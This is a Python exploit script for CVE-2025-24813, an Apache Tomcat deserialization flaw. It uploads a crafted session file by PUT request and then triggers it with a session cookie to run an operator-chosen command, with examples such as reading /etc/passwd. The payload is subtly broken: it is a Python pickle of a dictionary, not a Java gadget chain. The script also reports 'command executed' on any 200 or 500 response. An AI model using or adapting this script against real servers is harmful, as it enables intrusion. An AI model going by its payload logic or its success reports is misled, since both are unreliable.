#!/usr/bin/env python3
"""
CVE-2025-24813 - Apache Tomcat Deserialization RCE
Tool by: cybertechmind.com

Exploits unsafe deserialization in Apache Tomcat through partial PUT requests
and session file manipulation to achieve remote code execution.
"""

import argparse
import sys
import hashlib
import time
import random
import string
import base64
from pathlib import Path
from urllib.parse import urljoin
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Add parent directory to path for shared imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from shared import Theme, Signature, BannerDisplay

# Import configuration from this module's __init__.py
current_dir = Path(__file__).parent
sys.path.insert(0, str(current_dir))

try:
    from . import CVE, TOOL, ASCII_ART, EXPLOIT_CONFIG
except ImportError:
    # Fallback for direct execution
    import __init__ as config
    CVE = config.CVE
    TOOL = config.TOOL
    ASCII_ART = config.ASCII_ART
    EXPLOIT_CONFIG = config.EXPLOIT_CONFIG

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class ExploitConfig:
    """Configuration for CVE-2025-24813 exploit"""
    
    def __init__(self):
        self.target_url = None
        self.payload_cmd = None
        self.timeout = EXPLOIT_CONFIG['timeout']
        self.verify_ssl = EXPLOIT_CONFIG['verify_ssl']
        self.session_id = None


class PayloadGenerator:
    """Generates malicious payloads for Tomcat deserialization"""
    
    @staticmethod
    def generate_session_id(length: int = 32) -> str:
        """Generate random session ID"""
        chars = string.ascii_uppercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    @staticmethod
    def build_gadget_chain(command: str) -> bytes:
        """
        Build deserialization gadget chain for command execution
        
        This is a simplified representation. In a real exploit, you would use
        ysoserial or custom gadget chains with libraries like commons-collections.
        
        Args:
            command: Shell command to execute
            
        Returns:
            Serialized payload bytes
        """
        # Simplified payload representation
        # Real implementation would use ysoserial CommonsCollections gadgets
        payload_template = {
            "class": "org.apache.catalina.session.StandardSession",
            "sessionId": PayloadGenerator.generate_session_id(),
            "attributes": {
                "payload": {
                    "class": "org.apache.commons.collections.functors.InvokerTransformer",
                    "command": command
                }
            }
        }
        
        # In production, this would be a properly serialized Java object
        import pickle
        return pickle.dumps(payload_template)


class ExploitEngine:
    """Main exploitation engine for CVE-2025-24813"""
    
    def __init__(self, config: ExploitConfig, display: BannerDisplay):
        """
        Initialize exploit engine with dependency injection
        
        Args:
            config: Exploitation configuration
            display: Banner display for UI output (injected)
        """
        self.config = config
        self.display = display
        self.session = requests.Session()
        self.config.session_id = PayloadGenerator.generate_session_id(
            EXPLOIT_CONFIG['session_id_length']
        )
        
    def craft_headers(self, content_length: int) -> dict:
        """Craft HTTP headers for exploitation"""
        user_agent = EXPLOIT_CONFIG['user_agent_template'].format(
            author=TOOL.author.replace(' ', '-'),
            version=TOOL.version,
            website=TOOL.website
        )
        return {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Range': EXPLOIT_CONFIG['content_range_header'],
            'Content-Length': str(content_length),
            'User-Agent': user_agent,
            'Cookie': f'JSESSIONID={self.config.session_id}'
        }
    
    def step1_upload_payload(self) -> tuple:
        """
        Step 1: Upload malicious serialized payload via PUT request
        
        Returns:
            Tuple of (success, message)
        """
        self.display.show_info("Step 1: Uploading malicious session payload...")
        
        # Generate malicious gadget chain
        payload = PayloadGenerator.build_gadget_chain(self.config.payload_cmd)
        
        # Target session file path
        session_path = f"/sessions/{self.config.session_id}.session"
        upload_url = urljoin(self.config.target_url, session_path)
        
        headers = self.craft_headers(len(payload))
        
        try:
            response = self.session.put(
                upload_url,
                data=payload,
                headers=headers,
                timeout=self.config.timeout,
                verify=self.config.verify_ssl
            )
            
            if response.status_code in [200, 201, 204]:
                return True, "Payload uploaded successfully"
            else:
                return False, f"Upload failed with status {response.status_code}"
                
        except requests.exceptions.RequestException as e:
            return False, f"Upload error: {str(e)}"
    
    def step2_trigger_deserialization(self) -> tuple:
        """
        Step 2: Trigger deserialization by requesting session
        
        Returns:
            Tuple of (success, status_type, output/error)
        """
        self.display.show_info("Step 2: Triggering deserialization...")
        
        # Any request with the session cookie will trigger deserialization
        headers = {
            'Cookie': f'JSESSIONID={self.config.session_id}',
            'User-Agent': EXPLOIT_CONFIG['user_agent_template'].format(
                author=TOOL.author.replace(' ', '-'),
                version=TOOL.version,
                website=TOOL.website
            )
        }
        
        try:
            response = self.session.get(
                self.config.target_url,
                headers=headers,
                timeout=self.config.timeout,
                verify=self.config.verify_ssl
            )
            
            # Check for command execution evidence
            # This is simplified - real exploit would have proper output extraction
            if response.status_code == 500:
                return True, 'success', f"Command executed (Server Error: {self.config.payload_cmd})"
            elif response.status_code == 200:
                return True, 'success', f"Command likely executed: {self.config.payload_cmd}"
            else:
                return False, 'unknown', f"HTTP {response.status_code}"
                
        except requests.exceptions.Timeout:
            return False, 'timeout', 'Request timeout'
        except requests.exceptions.RequestException as e:
            return False, 'unknown', str(e)
    
    def execute(self) -> tuple:
        """
        Execute the complete exploitation chain
        
        Returns:
            Tuple of (success, status_type, output/error)
        """
        self.display.show_info("Initiating Tomcat deserialization attack...")
        
        # Step 1: Upload payload
        success, message = self.step1_upload_payload()
        if not success:
            return False, 'upload_failed', message
        
        self.display.show_info(f"âœ“ {message}")
        
        # Step 2: Trigger deserialization
        return self.step2_trigger_deserialization()


def main():
    """Main execution flow with dependency injection"""
    
    # Initialize signature with tool information from config
    sig = Signature(
        tool_name=TOOL.tool_name,
        version=TOOL.version,
        exploit_name=TOOL.exploit_name
    )
    
    # Initialize display with injected signature
    display = BannerDisplay(sig)
    
    # Show header with ASCII art from config
    display.show_header(ASCII_ART)
    
    # Additional CVE link from config
    print(f"{Theme.OKBLUE}CVE Link: {CVE.references[0]}{Theme.ENDC}\n")
    
    # Parse arguments
    parser = argparse.ArgumentParser(
        description=sig.tool_name,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  exploit.py -t http://target.com:8080 -c "whoami"
  exploit.py -t http://localhost:8080 -c "id"
  exploit.py -t http://vulnerable-tomcat.com -c "cat /etc/passwd"

{sig.get_footer()}
        """
    )
    
    parser.add_argument('-t', '--target', 
                       metavar='URL',
                       required=True,
                       help='Target Tomcat server URL')
    parser.add_argument('-c', '--command',
                       metavar='CMD',
                       required=True,
                       help='Command to execute on target')
    
    args = parser.parse_args()
    
    # Configure exploit
    config = ExploitConfig()
    config.target_url = args.target if args.target.startswith('http') else f"http://{args.target}"
    config.payload_cmd = args.command
    
    # Show configuration
    display.show_config({
        'target': config.target_url,
        'command': config.payload_cmd,
        'session_id': config.session_id or 'auto-generated'
    })
    
    # Execute exploit with dependency injection
    engine = ExploitEngine(config, display)
    success, status, data = engine.execute()
    
    # Display results
    if success:
        display.show_success(data)
        sys.exit(0)
    else:
        display.show_failure(status, data)
        sys.exit(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Theme.WARNING}[!] Exploitation interrupted by user{Theme.ENDC}\n")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Theme.FAIL}[!] Fatal error: {e}{Theme.ENDC}\n")
        sys.exit(1)
